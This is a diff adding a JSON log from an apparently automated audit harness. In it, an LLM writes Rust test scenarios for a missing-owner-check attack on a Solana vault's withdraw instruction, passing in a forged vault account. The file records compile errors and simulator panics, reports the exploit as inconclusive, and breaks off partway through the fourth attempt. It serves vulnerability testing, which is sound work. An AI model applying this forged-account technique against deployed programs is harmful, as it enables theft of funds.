@@ -1,0 +1,338 @@
+{
+  "category": "OWNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": null,
+  "reason": "o cenario entrou em panico antes do ataque: thread 'scenario' (33859) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2729,
+        "completion_tokens": 1001,
+        "latency_s": 5.48
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta vault legitima com dados contendo a authority real e saldo, e uma conta authority signer. O baseline executa withdraw com a vault real e a authority correta, provando que o cenario esta montado. O ataque substitui a vault por uma conta forjada cujo dono e outro programa (ou system) e cujos dados colocam a authority do atacante em [8..40] e saldo alto em [40..48], mantendo a mesma authority signer. O efeito mede que a conta forjada foi aceita e usada: os lamports da conta forjada foram debitados e os do recipient creditados, apesar do dono diferente do programa.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: dados = [8 bytes discriminador/prefixo] + authority (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet ix_data = [1u8, 500_000u64.to_le_bytes()[0], 500_000u64.to_le_bytes()[1], 500_000u64.to_le_bytes()[2], 500_000u64.to_le_bytes()[3], 500_000u64.to_le_bytes()[4], 500_000u64.to_le_bytes()[5], 500_000u64.to_le_bytes()[6], 500_000u64.to_le_bytes()[7]];\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\n\\n// Baseline: vault real, authority correta\\nlet vault_legit_key = Pubkey::new_unique();\\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\\nlet contas_baseline = vec![\\n    (vault_legit_key, vault_legit),\\n    (authority, authority_acc),\\n    (recipient, recipient_acc),\\n];\\nlet r_base = env.baseline(\\\"withdraw legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\\nlet vault_forged_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[8..40].copy_from_slice(authority.as_ref());\\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\\n\\nlet ix_attack = env.raw_ix(&ix_data, metas);\\nlet contas_attack = vec![\\n    (vault_forged_key, vault_forged),\\n    (authority, wallet(1_000_000)),\\n    (recipient, wallet(1_000_000)),\\n];\\nlet r = env.attack(\\\"withdraw com vault forjada\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_forged_key);\\n    let recipient_after = after(&r, &recipient);\\n    env.effect(\\\"vault forjada debitada\\\", vault_after.lamports() == 1_500_000);\\n    env.effect(\\\"recipient creditado\\\", recipient_after.lamports() == 1_500_000);\\n    env.effect(\\\"saldo forjado atualizado\\\", read_u64(vault_after.data(), 40) == 500_000);\\n}\"\n}",
+      "plan": "Preparamos uma conta vault legitima com dados contendo a authority real e saldo, e uma conta authority signer. O baseline executa withdraw com a vault real e a authority correta, provando que o cenario esta montado. O ataque substitui a vault por uma conta forjada cujo dono e outro programa (ou system) e cujos dados colocam a authority do atacante em [8..40] e saldo alto em [40..48], mantendo a mesma authority signer. O efeito mede que a conta forjada foi aceita e usada: os lamports da conta forjada foram debitados e os do recipient creditados, apesar do dono diferente do programa.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: dados = [8 bytes discriminador/prefixo] + authority (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet ix_data = [1u8, 500_000u64.to_le_bytes()[0], 500_000u64.to_le_bytes()[1], 500_000u64.to_le_bytes()[2], 500_000u64.to_le_bytes()[3], 500_000u64.to_le_bytes()[4], 500_000u64.to_le_bytes()[5], 500_000u64.to_le_bytes()[6], 500_000u64.to_le_bytes()[7]];\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\n\n// Baseline: vault real, authority correta\nlet vault_legit_key = Pubkey::new_unique();\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\nlet contas_baseline = vec![\n    (vault_legit_key, vault_legit),\n    (authority, authority_acc),\n    (recipient, recipient_acc),\n];\nlet r_base = env.baseline(\"withdraw legitimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\nlet vault_forged_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 48];\nforged_data[8..40].copy_from_slice(authority.as_ref());\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\n\nlet ix_attack = env.raw_ix(&ix_data, metas);\nlet contas_attack = vec![\n    (vault_forged_key, vault_forged),\n    (authority, wallet(1_000_000)),\n    (recipient, wallet(1_000_000)),\n];\nlet r = env.attack(\"withdraw com vault forjada\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_forged_key);\n    let recipient_after = after(&r, &recipient);\n    env.effect(\"vault forjada debitada\", vault_after.lamports() == 1_500_000);\n    env.effect(\"recipient creditado\", recipient_after.lamports() == 1_500_000);\n    env.effect(\"saldo forjado atualizado\", read_u64(vault_after.data(), 40) == 500_000);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:23:26\n   |\n23 |         AccountMeta::new(vault_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n23 -         AccountMeta::new(vault_legit_key, false),\n23 +         AccountMeta::new(vault_legit, false),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:23:26\n   |\n23 |         AccountMeta::new(vault_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n23 -         AccountMeta::new(vault_legit_key, false),\n23 +         AccountMeta::new(vault_legit, false),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3667,
+        "completion_tokens": 922,
+        "latency_s": 4.52
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta vault legitima com dono = program_id, dados contendo a authority e saldo, e executo um withdraw legitimo como baseline (deve ter sucesso). Em seguida, ataco passando uma conta vault forjada cujo dono e outro programa (nao o program_id), com os mesmos dados (authority e saldo), mantendo a authority como signer. Se o programa nao checar o owner, o saque prossegue e debita lamports da conta forjada, creditando o recipient; o efeito mede que a conta forjada foi aceita e usada (saldo e lamports alterados).\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_legit_key = Pubkey::new_unique();\\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500_000;\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\n\\n// Baseline: vault real, authority correta\\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\\nlet contas_baseline = vec![\\n    (vault_legit_key, vault_legit),\\n    (authority, authority_acc),\\n    (recipient, recipient_acc),\\n];\\nlet _r_base = env.baseline(\\\"withdraw legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\\nlet vault_forged_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[8..40].copy_from_slice(authority.as_ref());\\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\\n\\nlet ix_attack = env.raw_ix(&ix_data, metas);\\nlet contas_attack = vec![\\n    (vault_forged_key, vault_forged),\\n    (authority, wallet(1_000_000)),\\n    (recipient, wallet(1_000_000)),\\n];\\nlet r = env.attack(\\\"withdraw com vault forjada\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_forged_key);\\n    let recipient_after = after(&r, &recipient);\\n    env.effect(\\\"vault forjada debitada\\\", vault_after.lamports() == 1_500_000);\\n    env.effect(\\\"recipient creditado\\\", recipient_after.lamports() == 1_500_000);\\n    env.effect(\\\"saldo forjado atualizado\\\", read_u64(vault_after.data(), 40) == 500_000);\\n}\"\n}",
+      "plan": "Preparo uma conta vault legitima com dono = program_id, dados contendo a authority e saldo, e executo um withdraw legitimo como baseline (deve ter sucesso). Em seguida, ataco passando uma conta vault forjada cujo dono e outro programa (nao o program_id), com os mesmos dados (authority e saldo), mantendo a authority como signer. Se o programa nao checar o owner, o saque prossegue e debita lamports da conta forjada, creditando o recipient; o efeito mede que a conta forjada foi aceita e usada (saldo e lamports alterados).",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_legit_key = Pubkey::new_unique();\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500_000;\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\n\n// Baseline: vault real, authority correta\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\nlet contas_baseline = vec![\n    (vault_legit_key, vault_legit),\n    (authority, authority_acc),\n    (recipient, recipient_acc),\n];\nlet _r_base = env.baseline(\"withdraw legitimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\nlet vault_forged_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 48];\nforged_data[8..40].copy_from_slice(authority.as_ref());\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\n\nlet ix_attack = env.raw_ix(&ix_data, metas);\nlet contas_attack = vec![\n    (vault_forged_key, vault_forged),\n    (authority, wallet(1_000_000)),\n    (recipient, wallet(1_000_000)),\n];\nlet r = env.attack(\"withdraw com vault forjada\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_forged_key);\n    let recipient_after = after(&r, &recipient);\n    env.effect(\"vault forjada debitada\", vault_after.lamports() == 1_500_000);\n    env.effect(\"recipient creditado\", recipient_after.lamports() == 1_500_000);\n    env.effect(\"saldo forjado atualizado\", read_u64(vault_after.data(), 40) == 500_000);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "0120a10700000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0000000000000000",
+                "digest": "c1249ee2fe021860",
+                "post": "0000000000000000000000000000000200000000000000000000000000000000000000000000000020a1070000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "thread 'scenario' (33733) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o cenario entrou em panico antes do ataque: thread 'scenario' (33733) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3575,
+        "completion_tokens": 968,
+        "latency_s": 4.46
+      },
+      "raw": "{\"plan\": \"O erro indica que o programa (ou o runtime) exige a presença do System Program (11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP) entre as contas. Vou incluir system_program_account() nas contas e nos metas tanto do baseline quanto do ataque. O baseline usa uma vault legítima (dono = program_id) com authority correta; o ataque usa uma vault forjada com dono diferente (Pubkey::new_unique()) e dados que satisfazem a checagem de authority, medindo o débito da conta forjada e o crédito ao recipient.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_legit_key = Pubkey::new_unique();\\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500_000;\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet (sys_id, sys_acc) = system_program_account();\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n    AccountMeta::new_readonly(sys_id, false),\\n];\\n\\n// Baseline: vault real, authority correta\\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\\nlet contas_baseline = vec![\\n    (vault_legit_key, vault_legit),\\n    (authority, authority_acc),\\n    (recipient, recipient_acc),\\n    (sys_id, sys_acc),\\n];\\nlet _r_base = env.baseline(\\\"withdraw legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\\nlet vault_forged_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[8..40].copy_from_slice(authority.as_ref());\\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\\n\\nlet ix_attack = env.raw_ix(&ix_data, metas);\\nlet contas_attack = vec![\\n    (vault_forged_key, vault_forged),\\n    (authority, wallet(1_000_000)),\\n    (recipient, wallet(1_000_000)),\\n    (sys_id, system_program_account().1),\\n];\\nlet r = env.attack(\\\"withdraw com vault forjada\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_forged_key);\\n    let recipient_after = after(&r, &recipient);\\n    env.effect(\\\"vault forjada debitada\\\", vault_after.lamports() == 1_500_000);\\n    env.effect(\\\"recipient creditado\\\", recipient_after.lamports() == 1_500_000);\\n    env.effect(\\\"saldo forjado atualizado\\\", read_u64(vault_after.data(), 40) == 500_000);\\n}\"}",
+      "plan": "O erro indica que o programa (ou o runtime) exige a presença do System Program (11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP) entre as contas. Vou incluir system_program_account() nas contas e nos metas tanto do baseline quanto do ataque. O baseline usa uma vault legítima (dono = program_id) com authority correta; o ataque usa uma vault forjada com dono diferente (Pubkey::new_unique()) e dados que satisfazem a checagem de authority, medindo o débito da conta forjada e o crédito ao recipient.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_legit_key = Pubkey::new_unique();\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500_000;\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet (sys_id, sys_acc) = system_program_account();\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n    AccountMeta::new_readonly(sys_id, false),\n];\n\n// Baseline: vault real, authority correta\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\nlet contas_baseline = vec![\n    (vault_legit_key, vault_legit),\n    (authority, authority_acc),\n    (recipient, recipient_acc),\n    (sys_id, sys_acc),\n];\nlet _r_base = env.baseline(\"withdraw legitimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\nlet vault_forged_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 48];\nforged_data[8..40].copy_from_slice(authority.as_ref());\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\n\nlet ix_attack = env.raw_ix(&ix_data, metas);\nlet contas_attack = vec![\n    (vault_forged_key, vault_forged),\n    (authority, wallet(1_000_000)),\n    (recipient, wallet(1_000_000)),\n    (sys_id, system_program_account().1),\n];\nlet r = env.attack(\"withdraw com vault forjada\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_forged_key);\n    let recipient_after = after(&r, &recipient);\n    env.effect(\"vault forjada debitada\", vault_after.lamports() == 1_500_000);\n    env.effect(\"recipient creditado\", recipient_after.lamports() == 1_500_000);\n    env.effect(\"saldo forjado atualizado\", read_u64(vault_after.data(), 40) == 500_000);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo",
+            "result": "Success",
+            "compute_units": 438,
+            "account_flags": "-w,sr,-w,-r",
+            "ix_head": "0120a10700000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0000000000000000",
+                "digest": "c1249ee2fe021860",
+                "post": "0000000000000000000000000000000200000000000000000000000000000000000000000000000020a1070000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "thread 'scenario' (33775) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 438 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o cenario entrou em panico antes do ataque: thread 'scenario' (33775) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3621,
+        "completion_tokens": 919,
+        "latency_s": 4.18
+      },
+      "raw": "{\n  \"plan\": \"O cenario anterior falhou porque o System Program foi incluido nas contas mas nao era necessario (a instrucao withdraw nao usa o System Program). Vou remover o System Program das metas e das contas. O baseline usa uma vault legitima com authority correta e saldo suficiente. O ataque usa uma vault forjada com dono diferente do programa, contendo a authority do atacante e saldo alto, para verificar se o programa aceita a conta sem checar o owner. O efeito mede se a vault forjada foi debitada e o recipient creditado, o que so ocorre se o ataque for bem-sucedido.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_legit_key = Pubkey::new_unique();\\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500_000;\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\n\\n// Baseline: vault real, authority correta\\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\\nlet contas_baseline = vec![\\n    (vault_legit_key, vault_legit),\\n    (authority, authority_acc),\\n    (recipient, recipient_acc),\\n];\\nlet _r_base = env.baseline(\\\"withdraw legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\\nlet vault_forged_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[8..40].copy_from_slice(authority.as_ref());\\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\\n\\nlet ix_attack = env.raw_ix(&ix_data, metas);\\nlet contas_attack = vec![\\n    (vault_forged_key, vault_forged),\\n    (authority, wallet(1_000_000)),\\n    (recipient, wallet(1_000_000)),\\n];\\nlet r = env.attack(\\\"withdraw com vault forjada\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_forged_key);\\n    let recipient_after = after(&r, &recipient);\\n    env.effect(\\\"vault forjada debitada\\\", vault_after.lamports() == 1_500_000);\\n    env.effect(\\\"recipient creditado\\\", recipient_after.lamports() == 1_500_000);\\n    env.effect(\\\"saldo forjado atualizado\\\", read_u64(vault_after.data(), 40) == 500_000);\\n}\"\n}",
+      "plan": "O cenario anterior falhou porque o System Program foi incluido nas contas mas nao era necessario (a instrucao withdraw nao usa o System Program). Vou remover o System Program das metas e das contas. O baseline usa uma vault legitima com authority correta e saldo suficiente. O ataque usa uma vault forjada com dono diferente do programa, contendo a authority do atacante e saldo alto, para verificar se o programa aceita a conta sem checar o owner. O efeito mede se a vault forjada foi debitada e o recipient creditado, o que so ocorre se o ataque for bem-sucedido.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_legit_key = Pubkey::new_unique();\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500_000;\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\n\n// Baseline: vault real, authority correta\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\nlet contas_baseline = vec![\n    (vault_legit_key, vault_legit),\n    (authority, authority_acc),\n    (recipient, recipient_acc),\n];\nlet _r_base = env.baseline(\"withdraw legitimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\nlet vault_forged_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 48];\nforged_data[8..40].copy_from_slice(authority.as_ref());\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\n\nlet ix_attack = env.raw_ix(&ix_data, metas);\nlet contas_attack = vec![\n    (vault_forged_key, vault_forged),\n    (authority, wallet(1_000_000)),\n    (recipient, wallet(1_000_000)),\n];\nlet r = env.attack(\"withdraw com vault forjada\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_forged_key);\n    let recipient_after = after(&r, &recipient);\n    env.effect(\"vault forjada debitada\", vault_after.lamports() == 1_500_000);\n    env.effect(\"recipient creditado\", recipient_after.lamports() == 1_500_000);\n    env.effect(\"saldo forjado atualizado\", read_u64(vault_after.data(), 40) == 500_000);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "0120a10700000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
